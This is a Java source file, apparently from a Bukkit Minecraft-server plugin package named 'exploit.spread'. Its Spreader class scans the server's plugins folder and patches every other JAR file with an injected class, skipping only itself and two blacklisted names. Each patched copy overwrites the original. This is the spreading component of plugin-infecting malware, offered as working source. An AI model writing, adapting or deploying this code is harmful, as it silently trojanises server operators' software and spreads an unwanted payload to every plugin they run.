package com.tmquan2508.exploit.spread;

import org.bukkit.plugin.Plugin;

import java.io.File;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;
import java.util.logging.Level;
import com.tmquan2508.exploit.Exploit;

public final class Spreader {

    private static final Set<String> BLACKLIST = new HashSet<>(Arrays.asList(
        "HostifyMonitor.jar",
        "FakaHedaMinequery.jar"
    ));

    public static void beginSpreading(Plugin selfPlugin, Class<?> sourceClassToInject) {
        Exploit.sender.sendDebug(Level.INFO, "[Spreader] Scanning plugins folder for targets...");

        File pluginsDir = selfPlugin.getDataFolder().getParentFile();
        if (pluginsDir == null || !pluginsDir.isDirectory()) {
            Exploit.sender.sendDebug(Level.SEVERE, "[Spreader] CRITICAL: Could not find plugins directory.");
            return;
        }

        File[] pluginFiles = pluginsDir.listFiles();
        if (pluginFiles == null) {
            Exploit.sender.sendDebug(Level.SEVERE, "[Spreader] Could not list files in the plugins folder.");
            return;
        }

        String selfJarName = getSelfJarName(selfPlugin);
        if (selfJarName != null) {
            Exploit.sender.sendDebug(Level.INFO, "[Spreader] Current payload is running from: " + selfJarName);
        }

        for (File targetJarFile : pluginFiles) {
            String fileName = targetJarFile.getName();

            if (targetJarFile.isDirectory()) continue;
            if (!fileName.toLowerCase().endsWith(".jar")) continue;
            if (BLACKLIST.contains(fileName)) continue;
            if (fileName.equals(selfJarName)) continue;

            try {
                String originalPath = targetJarFile.getAbsolutePath();
                System.out.printf("[Spreader] Found target: '%s'%n", fileName);

                Path tempOutputPath = Files.createTempFile("patch-", ".tmp.jar");

                boolean success = Patcher.patchFile(originalPath, tempOutputPath.toString(), sourceClassToInject);

                if (success) {
                    Exploit.sender.sendDebug(Level.INFO, "[Spreader] Patch successful for " + fileName + ". Replacing original JAR.");
                    Files.move(tempOutputPath, Paths.get(originalPath), StandardCopyOption.REPLACE_EXISTING);
                } else {
                    Files.deleteIfExists(tempOutputPath);
                }

            } catch (Exception e) {
                Exploit.sender.sendDebug(Level.SEVERE, "[Spreader] An error occurred while trying to patch " + fileName + ": " + e.getMessage());
                e.printStackTrace();
            }
        }
        Exploit.sender.sendDebug(Level.INFO, "[Spreader] Spreading process finished.");
    }

    private static String getSelfJarName(Plugin plugin) {
        try {
            String path = plugin.getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
            String decodedPath = URLDecoder.decode(path, StandardCharsets.UTF_8.name());
            File jarFile = new File(decodedPath);
            return jarFile.getName();
        } catch (Exception e) {
            Exploit.sender.sendDebug(Level.SEVERE, "[Spreader] Could not determine self JAR name: " + e.getMessage());
            return null;
        }
    }
}